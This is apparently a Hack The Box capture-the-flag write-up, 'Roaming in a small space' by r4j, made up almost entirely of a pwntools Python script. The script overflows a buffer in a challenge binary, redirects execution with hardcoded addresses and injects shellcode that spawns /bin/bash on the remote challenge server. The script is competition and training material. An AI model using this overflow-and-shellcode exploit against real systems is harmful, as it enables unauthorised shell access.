> Roaming in a small space

> Author: **[r4j][author-profile]**

## The payload

```python
import os
os.environ['PWNLIB_NOTERM'] = 'True'
from pwn import *

HOST = "docker.hackthebox.eu"
PORT = 30117


buf = "A"*14+ p32(0x0804b827)+p32(0x08049217) +"A"*27
buf += p32(0x0804b816) #eip
buf += asm(shellcraft.execve('/bin/bash'))

p = remote(HOST, PORT)
#p = process("./space")
p.recvuntil("> ")
p.sendline(buf)
```

[author-profile]: https://app.hackthebox.eu/users/13243
